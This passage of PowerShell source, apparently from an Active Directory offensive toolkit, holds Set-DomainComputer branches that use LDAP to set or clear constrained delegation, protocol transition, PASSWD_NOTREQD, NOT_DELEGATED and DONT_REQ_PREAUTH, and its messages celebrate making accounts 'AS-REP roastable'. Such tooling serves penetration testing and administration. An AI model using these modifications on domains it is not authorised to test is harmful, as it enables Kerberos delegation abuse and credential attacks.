                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "msDS-AllowedToDelegateTo"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            foreach ($spn in $NewSPNs) {
                                $Modification.Add($spn) | Out-Null
                            }

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetConstrainedDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    AddedSPNs = $AddedSPNs
                                    AllSPNs = $NewSPNs
                                    Success = $true
                                    Message = "Constrained Delegation configured - computer can now delegate to $($AddedSPNs.Count) new SPN(s)"
                                }
                            } else {
                                Show-Line "Successfully configured Constrained Delegation for: $($TargetComputer.sAMAccountName)" -Class Hint
                                foreach ($spn in $AddedSPNs) {
                                    Show-Line "  Added: $spn" -Class Note
                                }
                                Show-Line "Computer can now delegate to these services!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to set Constrained Delegation: $_"
                    }
                }

                'ClearConstrainedDelegation' {
                    Write-Log "[Set-DomainComputer] Clearing Constrained Delegation for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current SPNs
                        $CurrentSPNs = @()
                        if ($TargetComputer.'msDS-AllowedToDelegateTo') {
                            $spnValue = $TargetComputer.'msDS-AllowedToDelegateTo'
                            if ($spnValue -is [System.Array]) {
                                $CurrentSPNs = @($spnValue | ForEach-Object { [string]$_ })
                            }
                            else {
                                $CurrentSPNs = @([string]$spnValue)
                            }
                        }

                        Write-Log "[Set-DomainComputer] Current msDS-AllowedToDelegateTo ($($CurrentSPNs.Count)): $($CurrentSPNs -join ', ')"

                        if ($CurrentSPNs.Count -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearConstrainedDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "No Constrained Delegation SPNs present (no change)"
                                }
                            } else {
                                Show-Line "No Constrained Delegation SPNs present on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        elseif ($Force) {
                            # Remove ALL SPNs via ModifyRequest
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "msDS-AllowedToDelegateTo"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearConstrainedDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    RemovedSPNs = $CurrentSPNs
                                    Success = $true
                                    Message = "All $($CurrentSPNs.Count) Constrained Delegation SPN(s) removed"
                                }
                            } else {
                                Show-Line "Successfully removed all $($CurrentSPNs.Count) Constrained Delegation SPN(s) from: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                        elseif ($Principal) {
                            # Remove specific SPN
                            if ($CurrentSPNs -contains $Principal) {
                                $NewSPNs = [string[]]@($CurrentSPNs | Where-Object { $_ -ne $Principal })
                                Write-Log "[Set-DomainComputer] New msDS-AllowedToDelegateTo ($($NewSPNs.Count)): $($NewSPNs -join ', ')"

                                if ($NewSPNs.Count -eq 0) {
                                    # Last SPN removed - clear attribute entirely
                                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                                    $ModifyRequest.DistinguishedName = $ComputerDN

                                    $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                                    $Modification.Name = "msDS-AllowedToDelegateTo"
                                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete

                                    $ModifyRequest.Modifications.Add($Modification) | Out-Null
                                } else {
                                    # Replace with remaining SPNs
                                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                                    $ModifyRequest.DistinguishedName = $ComputerDN

                                    $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                                    $Modification.Name = "msDS-AllowedToDelegateTo"
                                    $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                                    foreach ($spn in $NewSPNs) {
                                        $Modification.Add($spn) | Out-Null
                                    }

                                    $ModifyRequest.Modifications.Add($Modification) | Out-Null
                                }

                                $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                                if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                    throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                                }

                                if ($PassThru) {
                                    return [PSCustomObject]@{
                                        Operation = "ClearConstrainedDelegation"
                                        Computer = $TargetComputer.sAMAccountName
                                        DistinguishedName = $ComputerDN
                                        RemovedSPN = $Principal
                                        RemainingSPNs = $NewSPNs
                                        Success = $true
                                        Message = "Constrained Delegation SPN removed"
                                    }
                                } else {
                                    Show-Line "Successfully removed SPN '$Principal' from: $($TargetComputer.sAMAccountName)" -Class Hint
                                }
                            }
                            else {
                                if ($PassThru) {
                                    return [PSCustomObject]@{
                                        Operation = "ClearConstrainedDelegation"
                                        Computer = $TargetComputer.sAMAccountName
                                        DistinguishedName = $ComputerDN
                                        Success = $false
                                        Message = "SPN '$Principal' not found. Use -Force to remove all SPNs."
                                    }
                                } else {
                                    Show-Line "SPN '$Principal' not found on: $($TargetComputer.sAMAccountName)" -Class Note
                                    Show-Line "Current SPNs: $($CurrentSPNs -join ', ')" -Class Note
                                    Show-Line "Use -Force to remove all SPNs" -Class Note
                                }
                            }
                        }
                        else {
                            # No -Force and no -Principal: list current SPNs
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearConstrainedDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $false
                                    Message = "Multiple SPNs present. Use -Principal to remove specific SPN or -Force to remove all."
                                    CurrentSPNs = $CurrentSPNs
                                }
                            } else {
                                Show-Line "Current Constrained Delegation SPNs on $($TargetComputer.sAMAccountName):" -Class Note
                                foreach ($spn in $CurrentSPNs) {
                                    Show-Line "  - $spn" -Class Note
                                }
                                Show-Line "Use -Principal <SPN> to remove specific SPN or -Force to remove all" -Class Note
                            }
                        }
                    } catch {
                        throw "Failed to clear Constrained Delegation: $_"
                    }
                }

                # ===== Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION / S4U2Self) =====
                'SetTrustedToAuthForDelegation' {
                    Write-Log "[Set-DomainComputer] Enabling Protocol Transition (S4U2Self) for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 (16777216)
                        $TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000

                        if (($CurrentUAC -band $TRUSTED_TO_AUTH_FOR_DELEGATION) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetTrustedToAuthForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "Protocol Transition (S4U2Self) already enabled (no change)"
                                }
                            } else {
                                Show-Line "Protocol Transition already enabled on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $TRUSTED_TO_AUTH_FOR_DELEGATION
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetTrustedToAuthForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Protocol Transition enabled - computer can obtain service tickets for users without their credentials!"
                                }
                            } else {
                                Show-Line "Successfully enabled Protocol Transition (S4U2Self) for: $($TargetComputer.sAMAccountName)" -Class Hint
                                Show-Line "Computer can now obtain service tickets for users without their credentials!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to enable Protocol Transition: $_"
                    }
                }

                'ClearTrustedToAuthForDelegation' {
                    Write-Log "[Set-DomainComputer] Disabling Protocol Transition (S4U2Self) for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 (16777216)
                        $TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000

                        if (($CurrentUAC -band $TRUSTED_TO_AUTH_FOR_DELEGATION) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearTrustedToAuthForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "Protocol Transition (S4U2Self) already disabled (no change)"
                                }
                            } else {
                                Show-Line "Protocol Transition already disabled on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $TRUSTED_TO_AUTH_FOR_DELEGATION)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearTrustedToAuthForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Protocol Transition disabled"
                                }
                            } else {
                                Show-Line "Successfully disabled Protocol Transition for: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to disable Protocol Transition: $_"
                    }
                }

                # ===== PASSWD_NOTREQD (0x0020) =====
                'SetPasswordNotRequired' {
                    Write-Log "[Set-DomainComputer] Setting PASSWD_NOTREQD flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # PASSWD_NOTREQD = 0x0020 (32)
                        $PASSWD_NOTREQD = 0x0020

                        if (($CurrentUAC -band $PASSWD_NOTREQD) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetPasswordNotRequired"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "PASSWD_NOTREQD already set (no change)"
                                }
                            } else {
                                Show-Line "PASSWD_NOTREQD already set on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $PASSWD_NOTREQD
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetPasswordNotRequired"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "PASSWD_NOTREQD flag set - computer account can have an empty password!"
                                }
                            } else {
                                Show-Line "Successfully set PASSWD_NOTREQD on: $($TargetComputer.sAMAccountName)" -Class Hint
                                Show-Line "Computer account can now have an empty password!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to set PASSWD_NOTREQD: $_"
                    }
                }

                'ClearPasswordNotRequired' {
                    Write-Log "[Set-DomainComputer] Clearing PASSWD_NOTREQD flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        $PASSWD_NOTREQD = 0x0020

                        if (($CurrentUAC -band $PASSWD_NOTREQD) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearPasswordNotRequired"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "PASSWD_NOTREQD already cleared (no change)"
                                }
                            } else {
                                Show-Line "PASSWD_NOTREQD already cleared on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $PASSWD_NOTREQD)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearPasswordNotRequired"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "PASSWD_NOTREQD flag cleared - password is required again"
                                }
                            } else {
                                Show-Line "Successfully cleared PASSWD_NOTREQD on: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to clear PASSWD_NOTREQD: $_"
                    }
                }

                # ===== DONT_EXPIRE_PASSWORD (0x10000) =====
                'SetPasswordNeverExpires' {
                    Write-Log "[Set-DomainComputer] Setting DONT_EXPIRE_PASSWORD flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # DONT_EXPIRE_PASSWORD = 0x10000 (65536)
                        $DONT_EXPIRE_PASSWORD = 0x10000

                        if (($CurrentUAC -band $DONT_EXPIRE_PASSWORD) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetPasswordNeverExpires"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "DONT_EXPIRE_PASSWORD already set (no change)"
                                }
                            } else {
                                Show-Line "DONT_EXPIRE_PASSWORD already set on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $DONT_EXPIRE_PASSWORD
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetPasswordNeverExpires"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "DONT_EXPIRE_PASSWORD flag set - password will never expire"
                                }
                            } else {
                                Show-Line "Successfully set DONT_EXPIRE_PASSWORD on: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to set DONT_EXPIRE_PASSWORD: $_"
                    }
                }

                'ClearPasswordNeverExpires' {
                    Write-Log "[Set-DomainComputer] Clearing DONT_EXPIRE_PASSWORD flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        $DONT_EXPIRE_PASSWORD = 0x10000

                        if (($CurrentUAC -band $DONT_EXPIRE_PASSWORD) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearPasswordNeverExpires"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "DONT_EXPIRE_PASSWORD already cleared (no change)"
                                }
                            } else {
                                Show-Line "DONT_EXPIRE_PASSWORD already cleared on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $DONT_EXPIRE_PASSWORD)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearPasswordNeverExpires"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "DONT_EXPIRE_PASSWORD flag cleared - password expiry follows domain policy"
                                }
                            } else {
                                Show-Line "Successfully cleared DONT_EXPIRE_PASSWORD on: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to clear DONT_EXPIRE_PASSWORD: $_"
                    }
                }

                # ===== NOT_DELEGATED (0x100000) =====
                'SetNotDelegated' {
                    Write-Log "[Set-DomainComputer] Setting NOT_DELEGATED flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # NOT_DELEGATED = 0x100000 (1048576)
                        $NOT_DELEGATED = 0x100000

                        if (($CurrentUAC -band $NOT_DELEGATED) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetNotDelegated"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "NOT_DELEGATED already set (no change)"
                                }
                            } else {
                                Show-Line "NOT_DELEGATED already set on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $NOT_DELEGATED
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetNotDelegated"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "NOT_DELEGATED flag set - account marked as sensitive, cannot be delegated"
                                }
                            } else {
                                Show-Line "Successfully set NOT_DELEGATED on: $($TargetComputer.sAMAccountName)" -Class Hint
                                Show-Line "Account is now marked as sensitive and cannot be delegated" -Class Note
                            }
                        }
                    } catch {
                        throw "Failed to set NOT_DELEGATED: $_"
                    }
                }

                'ClearNotDelegated' {
                    Write-Log "[Set-DomainComputer] Clearing NOT_DELEGATED flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # NOT_DELEGATED = 0x100000 (1048576)
                        $NOT_DELEGATED = 0x100000

                        if (($CurrentUAC -band $NOT_DELEGATED) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearNotDelegated"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "NOT_DELEGATED already cleared (no change)"
                                }
                            } else {
                                Show-Line "NOT_DELEGATED already cleared on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $NOT_DELEGATED)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearNotDelegated"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "NOT_DELEGATED flag cleared - account can be delegated again"
                                }
                            } else {
                                Show-Line "Successfully cleared NOT_DELEGATED on: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to clear NOT_DELEGATED: $_"
                    }
                }

                # ===== DONT_REQ_PREAUTH (0x400000) =====
                'SetDontReqPreauth' {
                    Write-Log "[Set-DomainComputer] Setting DONT_REQ_PREAUTH flag for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # DONT_REQ_PREAUTH = 0x400000 (4194304)
                        $DONT_REQ_PREAUTH = 0x400000

                        if (($CurrentUAC -band $DONT_REQ_PREAUTH) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetDontReqPreauth"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH already set (no change)"
                                }
                            } else {
                                Show-Line "DONT_REQ_PREAUTH already set on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $DONT_REQ_PREAUTH
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetDontReqPreauth"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "DONT_REQ_PREAUTH flag set - computer account is now AS-REP roastable!"
                                }
                            } else {
                                Show-Line "Successfully set DONT_REQ_PREAUTH on: $($TargetComputer.sAMAccountName)" -Class Hint
                                Show-Line "Computer account is now AS-REP roastable!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to set DONT_REQ_PREAUTH: $_"
                    }
                }

                'ClearDontReqPreauth' {
